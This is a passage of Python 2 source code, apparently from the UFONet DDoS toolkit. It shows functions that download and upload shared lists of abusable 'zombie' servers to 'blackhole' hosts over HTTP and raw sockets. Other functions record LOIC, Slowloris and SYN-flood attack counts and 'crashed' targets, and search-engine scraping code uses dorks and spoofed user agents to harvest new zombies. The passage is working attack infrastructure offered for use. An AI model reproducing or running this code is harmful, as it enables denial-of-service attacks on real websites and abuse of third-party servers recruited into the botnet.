                app.start()
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print("\nTerminating void generation sequence...\n")
                app.collapse()
            except Exception, e:
                print "[Error] "+str(e) 
                print("\nSomething was wrong generating 'blackhole'. Aborting...\n")

        # download list of 'zombies' from a 'blackhole' IP
        if options.dip is not None:
            options.download = True
            self.blackhole = options.dip

        # download list of 'zombies' from server
        if options.download:
            try:
                self.banner()
                if options.dip is not None:
                    print("\nDownloading list of 'zombies' from server "+self.blackhole+" ...\n")
                else:
                    print("\nDownloading list of 'zombies' from server ...\n")
                print '='*22 + '\n'
                download_list = self.downloading_list()
            except Exception, e:
                print ("[Error] - Something wrong downloading!\n")
                return #sys.exit(2)

        # upload list of 'zombies' to a 'blackhole' IP
        if options.upip is not None:
            options.upload = True
            self.blackhole = options.upip
            
        # upload list of 'zombies' to server
        if options.upload:
            try:
                self.banner()
                if options.upip is not None:
                    print("\nUploading list of 'zombies' to server "+self.blackhole+" ...\n")
                else:
                    print("\nUploading list of 'zombies' to server ...\n")
                print '='*22 + '\n'
                upload_list = self.uploading_list()
            except Exception, e:
                print ("[Error] - Something wrong uploading!\n"+str(e))
		traceback.print_exc()
                return #sys.exit(2)

    # starting new zombie thread
    def connect_zombies(self, zombie): 
        z=Zombie(self, zombie)
        t = threading.Thread(target=z.connect, name=zombie)
        t.start()

    # single connection handling
    def connect_zombie(self, zombie): 
        z=Zombie(self,zombie)
        return z.connect()

    def extract_proxy(self, proxy):
        sep = ":"
        proxy_ip = proxy.rsplit(sep, 1)[0]
        if proxy_ip.startswith('http://'):
            proxy_ip = proxy_ip.replace('http://', '')
        elif proxy_ip.startswith('https://'):
            proxy_ip = proxy_ip.replace('https://', '')
        if proxy_ip == '127.0.0.1': # working by using 'localhost' as http proxy (privoxy, ...)
            proxy_ip = 'localhost'
        proxy_port = proxy.rsplit(sep, 1)[1]
        proxy_url = proxy_ip + ":" + proxy_port # ex: localhost:8118
        return proxy_url

    def proxy_transport(self, proxy):
        proxy_url = self.extract_proxy(proxy)
        proxy = urllib2.ProxyHandler({'https': proxy_url})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)

    def check_mothership_chargo(self):
        f = open(self.zombies_file)
        self.zombies = f.readlines()
        self.zombies = [zombie.replace('\n', '') for zombie in self.zombies]
        self.list_zombies = []
        for zombie in self.zombies:
            t = urlparse(zombie)
            name_zombie = t.netloc
            self.list_zombies.append(name_zombie)
        self.num_zombies = str(len(self.zombies))
        f.close()
        f = open(self.aliens_file)
        self.aliens = f.readlines()
        self.aliens = [alien.replace('\n', '') for alien in self.aliens]
        self.list_aliens = []
        for alien in self.aliens:
            t = urlparse(alien)
            name_alien = t.netloc
            self.list_aliens.append(name_alien)
        self.num_aliens = str(len(self.aliens))
        f.close()
        f = open(self.droids_file)
        self.droids = f.readlines()
        self.droids = [droid.replace('\n', '') for droid in self.droids]
        self.list_droids = []
        for droid in self.droids:
            t = urlparse(droid)
            name_droid = t.netloc
            self.list_droids.append(name_droid)
        self.num_droids = str(len(self.droids))
        f.close()
        f = open(self.ucavs_file)
        self.ucavs = f.readlines()
        self.ucavs = [ucav.replace('\n', '') for ucav in self.ucavs]
        self.list_ucavs = []
        for ucav in self.ucavs:
            t = urlparse(ucav)
            name_ucav = t.netloc
            self.list_ucavs.append(name_ucav)
        self.num_ucavs = str(len(self.ucavs))
        f.close()
        f = open(self.rpcs_file)
        self.rpcs = f.readlines()
        self.rpcs = [rpc.replace('\n', '') for rpc in self.rpcs]
        self.list_rpcs = []
        for rpc in self.rpcs:
            t = urlparse(rpc)
            name_rpc = t.netloc
            self.list_rpcs.append(name_rpc)
        self.num_rpcs = str(len(self.rpcs))
        f.close()
        self.total_botnet = str(int(self.num_zombies) + int(self.num_aliens) + int(self.num_droids) + int(self.num_ucavs) + int(self.num_rpcs))
        return self.total_botnet

    def update_flying_stats(self):
        if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
            with open(self.mothership_stats_file, "w") as f:
                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "crashed": "0"}, f, indent=4) # starting reset
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aflying = data["flying"]
        aflying = str(int(aflying) + 1) # add new flying time
        data["flying"] = aflying
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_mothership_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        acompleted = data["completed"]
        acompleted = str(int(acompleted) + 1) # add new completed attack
        data["completed"] = acompleted
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_targets_crashed(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        tcrashed = data["crashed"]
        tcrashed = str(int(tcrashed) + 1) # add new crashed target
        data["crashed"] = tcrashed
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_missions_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        missions = data["missions"]
        missions = str(int(missions) + 1) # add new mission target
        data["missions"] = missions
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_scanner_stats(self, num):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        scanner = data["scanner"]
        scanner = str(int(scanner) + int(num)) # add new zombies found by dorking to mothership stats
        data["scanner"] = scanner
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_transferred_stats(self, num):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        transferred = data["transferred"]
        transferred = str(int(transferred) + int(num)) # add new zombies found by downloading via blackholes to mothership stats
        data["transferred"] = transferred
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_max_chargo(self, chargo):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        amax_chargo = data["max_chargo"]
        if int(chargo) > int(amax_chargo): # new max chargo found
            amax_chargo = chargo # add new max chargo
        else:
            amax_chargo = data["max_chargo"]
        data["max_chargo"] = amax_chargo
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_loic_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aloic = data["loic"]
        aloic = str(int(aloic) + 1) # add new loic attack to recorded stats
        self.total_loic = self.total_loic + 1 # add new loic attack to session stats
        data["loic"] = aloic
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_loris_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aloris = data["loris"]
        aloris = str(int(aloris) + 1) # add new loris attack to recorded stats
        self.total_loris = self.total_loris + 1 # add new loris attack to session stats
        data["loris"] = aloris
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_ufosyn_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aufosyn = data["ufosyn"]
        aufosyn = str(int(aufosyn) + 1) # add new ufosyn attack to recorded stats
        self.total_syn = self.total_syn + 1 # add new ufosyn attack to session stats
        data["ufosyn"] = aufosyn
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def uploading_list(self): 
        import gzip
        abductions = "abductions.txt.gz"
        troops = "troops.txt.gz"
        robots = "robots.txt.gz"
        drones = "drones.txt.gz"
        reflectors = "reflectors.txt.gz"
        try:
            print("Checking integrity of 'blackhole'...\n")
            if self.options.forcessl:
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/abductions.txt.gz',
                        abductions)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/troops.txt.gz',
                        troops)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/robots.txt.gz',
                        robots)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/drones.txt.gz',
                        drones)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/reflectors.txt.gz',
                        reflectors)
            else:
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
                        abductions)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
                        troops)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
                        robots)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
                        drones)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
                        reflectors)
            print("Vortex: IS READY!")
            f_in_abductions = gzip.open(abductions, 'rb')
            f_out_abductions = open('abductions.txt', 'wb')
            f_out_abductions.write(f_in_abductions.read())
            f_in_abductions.close()
            f_out_abductions.close()
            os.remove(abductions) # remove .gz file
            num_zombies = 0
            with open('abductions.txt') as f:
                for _ in f:
                    num_zombies = num_zombies + 1
            print("\n[Info] - 'Zombies' on 'blackhole': "+ str(num_zombies))
            f_in_robots = gzip.open(robots, 'rb')
            f_out_robots = open('robots.txt', 'wb')
            f_out_robots.write(f_in_robots.read())
            f_in_robots.close()
            f_out_robots.close()
            os.remove(robots) # remove .gz file
            num_robots = 0
            with open('robots.txt') as f:
                for _ in f:
                    num_robots = num_robots + 1
            print("[Info] - 'Droids' on 'blackhole' : "+ str(num_robots))
            f_in_troops = gzip.open(troops, 'rb')
            f_out_troops = open('troops.txt', 'wb')
            f_out_troops.write(f_in_troops.read())
            f_in_troops.close()
            f_out_troops.close()
            os.remove(troops) # remove .gz file
            num_aliens = 0
            with open(self.aliens_file) as f:
                for _ in f:
                    num_aliens = num_aliens + 1
            print("[Info] - 'Aliens' on 'blackhole' : "+ str(num_aliens))
            f_in_drones = gzip.open(drones, 'rb')
            f_out_drones = open('drones.txt', 'wb')
            f_out_drones.write(f_in_drones.read())
            f_in_drones.close()
            f_out_drones.close()
            os.remove(drones) # remove .gz file
            num_drones = 0
            with open('drones.txt') as f:
                for _ in f:
                    num_drones = num_drones + 1
            print("[Info] - 'Drones' on 'blackhole' : "+ str(num_drones))
            f_in_reflectors = gzip.open(reflectors, 'rb')
            f_out_reflectors = open('reflectors.txt', 'wb')
            f_out_reflectors.write(f_in_reflectors.read())
            f_in_reflectors.close()
            f_out_reflectors.close()
            os.remove(reflectors) # remove .gz file
            num_reflectors = 0
            with open('reflectors.txt') as f:
                for _ in f:
                    num_reflectors = num_reflectors + 1
            print("[Info] - 'X-RPCs' on 'blackhole' : "+ str(num_reflectors))
            print '-'*12 + '\n'
            if not self.options.forceyes:
                update_reply = raw_input("Want to merge ONLY new 'zombies' into the server? (Y/n)")
                print '-'*25
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                os.remove('abductions.txt') # remove abductions file
                os.remove('troops.txt') # remove troops file
                os.remove('robots.txt') # remove robots file
                os.remove('drones.txt') # remove drones file
                os.remove('reflectors.txt') # remove reflectors file
                print "\n[Info] - Aborting upload process and cleaning temporal files. Bye!\n"
                return
            else:
                print "\n[Info] - Checking integrity of your list of 'zombies'. Starting test!\n" # only upload valid zombies
                print '='*35
                zombies = self.extract_zombies()
                if not zombies:
                    return
                test = self.testing(zombies)
                zombies_community = []
                zombies_added = 0
                f = open('abductions.txt')
                abductions = f.readlines()
                abductions = [abduction.strip() for abduction in abductions]
                f.close()
                fz = open(self.zombies_file)
                zombies = fz.readlines()
                zombies = [zombie.strip() for zombie in zombies]
                fz.close()
                for zombie in zombies:
                    if zombie not in abductions:
                        zombies_community.append(zombie)
                        zombies_added = zombies_added + 1
                    else:
                        pass
                print("[Info] - New 'zombies' found: " + str(zombies_added))
                aliens = self.extract_aliens()
                if not aliens:
                    return
                aliens_community = []
                aliens_added = 0
                f = open('troops.txt')
                troops = f.readlines()
                troops = [troop.strip() for troop in troops]
                f.close()
                fz = open(self.aliens_file)
                aliens = fz.readlines()
                aliens = [alien.strip() for alien in aliens]
                fz.close()
                for alien in aliens:
                    if alien not in troops:
                        aliens_community.append(alien)
                        aliens_added = aliens_added + 1
                    else:
                        pass
                print("[Info] - New 'aliens' found : " + str(aliens_added))
                droids = self.extract_droids()
                if not droids:
                    return
                droids_community = []
                droids_added = 0
                f = open('robots.txt')
                robots = f.readlines()
                robots = [robot.strip() for robot in robots]
                f.close()
                fz = open(self.droids_file)
                droids = fz.readlines()
                droids = [droid.strip() for droid in droids]
                fz.close()
                for droid in droids:
                    if droid not in robots:
                        droids_community.append(droid)
                        droids_added = droids_added + 1
                    else:
                        pass
                print("[Info] - New 'droids' found : " + str(droids_added))
                ucavs = self.extract_ucavs()
                if not ucavs:
                    return
                ucavs_community = []
                ucavs_added = 0
                f = open('drones.txt')
                drones = f.readlines()
                drones = [drone.strip() for drone in drones]
                f.close()
                fz = open(self.ucavs_file)
                ucavs = fz.readlines()
                ucavs = [ucav.strip() for ucav in ucavs]
                fz.close()
                for ucav in ucavs:
                    if ucav not in drones:
                        ucavs_community.append(ucav)
                        ucavs_added = ucavs_added + 1
                    else:
                        pass
                print("[Info] - New 'drones' found : " + str(ucavs_added))
                rpcs = self.extract_rpcs()
                if not ucavs:
                    return
                rpcs_community = []
                rpcs_added = 0
                f = open('reflectors.txt')
                reflectors = f.readlines()
                reflectors = [reflector.strip() for reflector in reflectors]
                f.close()
                fz = open(self.rpcs_file)
                rpcs = fz.readlines()
                rpcs = [rpc.strip() for rpc in rpcs]
                fz.close()
                for rpc in rpcs:
                    if rpc not in reflectors:
                        rpcs_community.append(rpc)
                        rpcs_added = rpcs_added + 1
                    else:
                        pass
                print("[Info] - New 'X-RPCs' found : " + str(rpcs_added))
                print '-'*12 + '\n'
                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0 and rpcs_added == 0: # not zombies of any type
                    os.remove('abductions.txt') # remove abductions file
                    os.remove('troops.txt') # remove troops file
                    os.remove('robots.txt') # remove robots file
                    os.remove('drones.txt') # remove ucavs file
                    os.remove('rpcs.txt') # remove rpcs file
                    print("[Info] - Hehehe.. You should try to search for new 'zombies'. These are already in this 'blackhole'. ;-)\n")
                    return
                else:
                    fc = gzip.open('community_zombies.txt.gz', 'wb')
                    for zombie in zombies_community:
                        fc.write(zombie.strip()+"\n")
                    fc.close()
                    os.remove('abductions.txt') # remove abductions file
                    fc = gzip.open('community_aliens.txt.gz', 'wb')
                    for alien in aliens_community:
                        fc.write(alien.strip()+"\n")
                    fc.close()
                    os.remove('troops.txt') # remove troops file
                    fc = gzip.open('community_droids.txt.gz', 'wb')
                    for droid in droids_community:
                        fc.write(droid.strip()+"\n")
                    fc.close()
                    os.remove('robots.txt') # remove robots file
                    fc = gzip.open('community_ucavs.txt.gz', 'wb')
                    for ucav in ucavs_community:
                        fc.write(ucav.strip()+"\n")
                    fc.close()
                    os.remove('drones.txt') # remove drones file
                    fc = gzip.open('community_rpcs.txt.gz', 'wb')
                    for rpc in rpcs_community:
                        fc.write(rpc.strip()+"\n")
                    fc.close()
                    os.remove('reflectors.txt') # remove reflectors file
                    print("[Info] - Starting to upload new 'zombies'...\n")
                    try: # open a socket and send data to ufonet_community reciever
                        host = self.blackhole 
                        cport = 9991
                        mport = 9990
                        try:
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
                            cs.connect((host, cport))
                            cs.send("SEND " + 'community_zombies.txt.gz')
                            cs.close()
                            f = open('community_zombies.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect((host, mport))
                            ms.send(data)
                            ms.close()
                            os.remove('community_zombies.txt.gz') # remove local zombies .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cs.connect((host, cport))
                            cs.send("SEND " + 'community_aliens.txt.gz')
                            cs.close()
                            f = open('community_aliens.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect((host, mport))
                            ms.send(data)
                            ms.close()
                            os.remove('community_aliens.txt.gz') # remove local aliens .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cs.connect((host, cport))
                            cs.send("SEND " + 'community_robots.txt.gz')
                            cs.close()
                            f = open('community_droids.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect((host, mport))
                            ms.send(data)
                            ms.close()
                            os.remove('community_droids.txt.gz') # remove local droids .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cs.connect((host, cport))
                            cs.send("SEND " + 'community_ucavs.txt.gz')
                            cs.close()
                            f = open('community_ucavs.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect((host, mport))
                            ms.send(data)
                            ms.close()
                            os.remove('community_ucavs.txt.gz') # remove local ucavs .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
                            cs.connect((host, cport))
                            cs.send("SEND " + 'community_rpcs.txt.gz')
                            cs.close()
                            f = open('community_rpcs.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect((host, mport))
                            ms.send(data)
                            ms.close()
                            os.remove('community_rpcs.txt.gz') # remove local rpcs .gz file after transfer
                            time.sleep(2) # sleep a bit more
                            print '-'*12 + '\n'
                            print("[Info] - Transfer: DONE!. Thanks for your contribution ;-)\n")
                        except Exception, e:
                            print str(e) + "\n"
                    except:
                        print '-'*12 + '\n'
                        print("[Error] - Connecting sockets to 'blackhole'. Aborting!\n")
                        return
        except:
            print '-'*12 + '\n'
            print("[Error] - Unable to upload list of 'zombies' to this 'blackhole'. ;(\n")
            return #sys.exit(2)

    def downloading_list(self): # add your mirror to protect/share/distribute zombies
        import urllib, gzip
        abductions = "abductions.txt.gz"
        troops = "troops.txt.gz"
        robots = "robots.txt.gz"
        drones = "drones.txt.gz"
        reflectors = "reflectors.txt.gz"
        try:
            print("Trying 'blackhole': "+self.blackhole+"\n")
            if self.options.forcessl:
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/abductions.txt.gz',
                       abductions)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/troops.txt.gz',
                       troops)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/robots.txt.gz',
                       robots)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/drones.txt.gz',
                       drones)
                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/reflectors.txt.gz',
                       reflectors)
            else:
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
                       abductions)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
                       troops)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
                       robots)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
                       drones)
                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
                       reflectors)
            print("Vortex: IS READY!")
        except:
            print("Vortex: FAILED!")
            print '-'*12 + '\n'
            print("[Error] - Unable to download list of 'zombies' from this 'blackhole'. ;(\n")
            return #sys.exit(2)
        print '-'*12 + '\n'
        f_in_abductions = gzip.open(abductions, 'rb')
        f_out_abductions = open('abductions.txt', 'wb')
        f_out_abductions.write(f_in_abductions.read())
        f_in_abductions.close()
        f_out_abductions.close()
        os.remove(abductions) # remove abductions .gz file
        f_in_troops = gzip.open(troops, 'rb')
        f_out_troops = open('troops.txt', 'wb')
        f_out_troops.write(f_in_troops.read())
        f_in_troops.close()
        f_out_troops.close()
        os.remove(troops) # remove troops .gz file
        f_in_robots = gzip.open(robots, 'rb')
        f_out_robots = open('robots.txt', 'wb')
        f_out_robots.write(f_in_robots.read())
        f_in_robots.close()
        f_out_robots.close()
        os.remove(robots) # remove abductions .gz file
        f_in_drones = gzip.open(drones, 'rb')
        f_out_drones = open('drones.txt', 'wb')
        f_out_drones.write(f_in_drones.read())
        f_in_drones.close()
        f_out_drones.close()
        os.remove(drones) # remove reflectors .gz file
        f_in_reflectors = gzip.open(reflectors, 'rb')
        f_out_reflectors = open('reflectors.txt', 'wb')
        f_out_reflectors.write(f_in_reflectors.read())
        f_in_reflectors.close()
        f_out_reflectors.close()
        os.remove(reflectors) # remove reflectors .gz file
        num_abductions = 0
        with open('abductions.txt') as f:
            for _ in f:
                num_abductions = num_abductions + 1
        print("[Info] - Zombies: " + str(num_abductions))
        num_robots = 0
        with open('robots.txt') as f:
            for _ in f:
                num_robots = num_robots + 1
        print("[Info] - Droids : " + str(num_robots))
        num_troops = 0
        with open('troops.txt') as f:
            for _ in f:
                num_troops = num_troops + 1
        print("[Info] - Aliens : " + str(num_troops))
        num_drones = 0
        with open('drones.txt') as f:
            for _ in f:
                num_drones = num_drones + 1
        print("[Info] - UCAVs  : " + str(num_drones))
        num_reflectors = 0
        with open('reflectors.txt') as f:
            for _ in f:
                num_reflectors = num_reflectors + 1
        print("[Info] - X-RPCs : " + str(num_reflectors))
        total_zombies = num_abductions + num_troops + num_robots + num_drones + num_reflectors
        print("\n[Info] - Congratulations!. Total downloaded: " + str(total_zombies))
        print '-'*12
        if not self.options.forceyes:
            update_reply = raw_input("\nWant to merge ONLY new 'troops' in your army? (Y/n)")
            print '-'*25
        else:
            update_reply = "Y"
        if update_reply == "n" or update_reply == "N":
            os.remove('abductions.txt') # remove abductions file
            os.remove('troops.txt') # remove troops file
            os.remove('robots.txt') # remove robots file
            os.remove('drones.txt') # remove drones file
            os.remove('reflectors.txt') # remove reflectors file
            print "\n[Info] - List downloaded has been removed. Bye!\n"
        else:
            zombies_ready = []
            f = open('abductions.txt')
            abductions = f.readlines()
            f.close()
            fz = open(self.zombies_file)
            zombies = fz.readlines()
            fz.close()
            for abduction in abductions:
                abduction = abduction.replace('\n','') 
                if abduction not in zombies:
                    zombies_ready.append(abduction)
                else:
                    pass
            self.update_zombies(zombies_ready)
            os.remove('abductions.txt') # remove abductions .txt file
            aliens_ready = []
            f = open('troops.txt')
            troops = f.readlines()
            f.close()
            fz = open(self.aliens_file)
            aliens = fz.readlines()
            fz.close()
            for alien in troops:
                alien = alien.replace('\n','')
                if alien not in aliens:
                    aliens_ready.append(alien)
                else:
                    pass
            self.update_aliens(aliens_ready)
            os.remove('troops.txt') # remove troops .txt file
            droids_ready = []
            f = open('robots.txt')
            robots = f.readlines()
            f.close()
            fz = open(self.droids_file)
            droids = fz.readlines()
            fz.close()
            for droid in robots:
                droid = droid.replace('\n','')
                if droid not in droids:
                    droids_ready.append(droid)
                else:
                    pass
            self.update_droids(droids_ready)
            os.remove('robots.txt') # remove robots .txt file
            ucavs_ready = []
            f = open('drones.txt')
            drones = f.readlines()
            f.close()
            fz = open(self.ucavs_file)
            ucavs = fz.readlines()
            fz.close()
            for drone in drones:
                drone = drone.replace('\n','')
                if drone not in ucavs:
                    ucavs_ready.append(drone)
                else:
                    pass
            self.update_ucavs(ucavs_ready)
            os.remove('drones.txt') # remove drones .txt file
            rpcs_ready = []
            f = open('reflectors.txt')
            reflectors = f.readlines()
            f.close()
            fz = open(self.rpcs_file)
            rpcs = fz.readlines()
            fz.close()
            for reflector in reflectors:
                reflector = reflector.replace('\n','')
                if reflector not in rpcs:
                    rpcs_ready.append(reflector)
                else:
                    pass
            self.update_rpcs(rpcs_ready)
            os.remove('reflectors.txt') # remove reflectors .txt file
            print "\n[Info] - Botnet updated! ;-)\n"
            self.update_transferred_stats(self.trans_zombies) # update json file with transferred stats (blackhole)

    def create_web_interface(self):
        # launch webserver+gui
        from webgui import ClientThread
        import webbrowser
        host = '0.0.0.0'
        port = 9999
        try: 
            webbrowser.open('http://127.0.0.1:9999', new=1)
            tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	    tcpsock.bind((host,port))
	    while True:
	        tcpsock.listen(4)
	        #print "Listening for incoming connections on http://%s:%d" % (host,port)
	        (clientsock, (ip, port)) = tcpsock.accept()
	        newthread = ClientThread(ip, port, clientsock)
                newthread.start()
        except (KeyboardInterrupt, SystemExit):
            sys.exit()

#    def crawlering(self):
#        # crawl target's links to discover web structure           
#        options = self.options
#        myurl = options.crawl
#        for i in re.findall('''href=["'](.[^"']+)["']''', urllib.urlopen(myurl).read(), re.I):
#            print i 

    def extract_dorks(self):
        # extract dorks from file (ex: 'dorks.txt')
        try:
            f = open(self.dorks_file)
            dorks = f.readlines()
            dorks = [ dork.replace('\n','') for dork in dorks ]
            f.close()
            if not dorks:
                if not options.autosearch:
                    print "\n[Error] - Imposible to retrieve 'dorks' from file.\n"
                return
            else:
                return dorks
        except:
            if not options.autosearch:
                if os.path.exists(self.dorks_file) == True:
                    print '[Error] - Cannot open:', 'dorks.txt', "\n"
                    return #sys.exit(2)
                else:
                    print '[Error] - Cannot found:', 'dorks.txt', "\n"
                    return #sys.exit(2)
            else:
                return

    def search_zombies(self, dork, zombies_found):
        # crawlering on search engine results to extract zombies
        options = self.options
        zombies = []
        if not options.engine: # default search engine
            options.engine = 'yahoo'
        #if options.engine == 'duck': # using duck [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
        #    url = 'https://duckduckgo.com/html/' # ex: POST -> path
        #    if options.search: # search from query
        #       q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results [ deprecated ]
        #    if options.dorks: # search from a dork
        #       q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results [ deprecated ]
        #    data = 'q=' + q + '&b=&kl=us-en&kp=-1' # evade safe search
        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        #    if options.verbose:
        #        print("[Info] Query used: " + url + " [POST -> " + data + "]\n")
        #    try:
        #        req = urllib2.Request(url, data, headers)
        #        rsp = urllib2.urlopen(req)
        #        content = rsp.read()
        #    except:
        #        print('[Error] - Unable to connect to duck\n')
        #        if options.allengines:
        #            return
        #        if not options.dorks:
        #            if not self.options.forceyes:
        #                update_reply = raw_input("Want to try a different search engine? (Y/n)")
        #            else:
        #                update_reply = "Y"
        #            if update_reply == "n" or update_reply == "N":
        #                return #sys.exit(2)
        #            print "\nSearch engines available:"
        #            print '-'*25
        #            for e in self.search_engines:
        #                print "+ "+e
        #            print '-'*25
        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
        #            return #sys.exit(2)
        #        else:
        #            req_reply = ''
        #    regex = '<a class="result__url" href="(.+?)"' # regex magics [05/08/2016]
        #    pattern = re.compile(regex)
        #    url_links = re.findall(pattern, req_reply)
        if options.engine == 'bing': # using bing [04/02/2018: OK!]
            url = 'https://www.bing.com/search?'
            if options.search: # search from query
                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks or options.autosearch: # search from a dork
                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'q':q, 'first':start }
            data = urllib.urlencode(query_string)
            url = url + data
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + "\n")
            try:
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
            except:
                print('[Error] Unable to connect to: bing\n')
                if options.allengines or options.autosearch:
                    return
                if not options.dorks or not options.autosearch:
                    if not self.options.forceyes:
                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print "\nSearch engines available:"
                    print '-'*25
                    for e in self.search_engines:
                        print "+ "+e
                    print '-'*25
                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)
        #elif options.engine == 'google': # google [07/10/2015: OK!] [09/08/2016: not working from TOR]
        #    url = 'https://www.google.com/xhtml?'
        #    if options.search: # search from query
        #        q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
        #    if options.dorks: # search from a dork
        #        q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
        #    start = 0 # set index number of first entry
        #    if options.num_results: # set number of results to search
        #        try:
        #            num = int(options.num_results)
        #        except:
        #            print("You should specify an integer!!!. Using default value: 10\n")
        #            num = 10
        #    else:
        #        num = 10 
        #    gws_rd = 'ssl' # set SSL as default
        #    query_string = { 'q':q, 'start':start, 'num':num, 'gws_rd':gws_rd }
        #    data = urllib.urlencode(query_string)
        #    url = url + data
